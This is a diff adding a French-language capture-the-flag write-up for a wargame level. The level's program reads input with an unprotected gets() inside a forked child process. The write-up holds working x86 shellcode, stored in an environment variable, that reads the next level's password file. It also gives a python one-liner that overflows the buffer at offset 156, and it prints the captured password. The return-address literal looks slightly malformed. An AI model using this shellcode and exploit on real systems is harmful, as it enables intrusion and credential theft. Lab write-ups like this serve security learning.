@@ -1,0 +1,40 @@
+Le programme affiche "Give me some shellcode, k", apres avoir rentrer un
+test il affiche "child is existing"
+
+-> Il attend du code shell ?
+
+Dans le code source on observe un gets pas protégé, qui peut nous permettre 
+d'overflow et/ou d'injecter du shellcode.
+
+On voit également au début du programme un fork -> toute l'execution se passe
+dans un child process.
+
+On doit trouver l'offset pour lancer l'exploit. Si je lance la commande directement dans gdb il me ressort : 
+child is existing...
+[Inferior 1 (process 1617) exited normally]
+Surement car tout se passe dans le child process
+
+Il faut donc le suivre le child process et pouvoir obtenir
+l'offset avec une commande dans gdb
+set follow-fork-mode child
+
+Là on obtient bien un segfault :
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1622]
+0x41326641 in ?? ()
+
+Je m'aide de ce site pour trouver l'offset :
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+On obtient un offset de 156.
+
+La fonction ptrace check l'utilisation de exec() qui mettra fin au programme. On doit avoir un shellcode qui ne fait pas appelle à cette fonction (pour ouvrir un shell par exemple). On va donc avoir un shellcode qui lit directement le mdp que l'on va mettre dans une variable d'environnement.
+
+export EGG=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
+
+Grace à un petit programme on va retrouver l'adresse de notre shellcode pour l'executer : /tmp/a.out
+0xffffd910
+
+python -c "print 156 * 'A' + '\xff\xff\xd9\xb10'[::-1]" | ./level04
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
